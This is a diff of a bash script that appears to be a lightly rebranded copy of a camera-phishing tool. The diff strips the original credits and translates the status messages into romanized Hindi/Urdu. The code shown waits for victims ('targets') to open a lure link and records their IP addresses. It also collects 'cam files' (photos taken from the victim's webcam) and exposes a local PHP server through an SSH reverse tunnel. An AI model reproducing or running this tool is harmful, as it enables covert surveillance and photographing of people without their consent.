@@ -1,7 +1,3 @@
-#!/bin/bash
-# Powered by kinghacker0
-# Credits goes to thelinuxchoice [github.com/thelinuxchoice/]
-
 trap 'printf "\n";stop' 2
 
 banner() {
@@ -64,12 +60,12 @@ cat ip.txt >> saved.ip.txt
 checkfound() {
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Target kay liya ruko ,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
 while [ true ]; do
 
 
 if [[ -e "ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Target nai link open kar liya hai !\n"
 catch_ip
 rm -rf ip.txt
 
@@ -78,7 +74,7 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] uski photo mil gye hai !\e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
@@ -108,7 +104,7 @@ $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:
 
 sleep 8
 fi
-printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Php server start ho raha hai... (localhost:3333)\e[0m\n"
 fuser -k 3333/tcp > /dev/null 2>&1
 php -S localhost:3333 > /dev/null 2>&1 &
 sleep 3
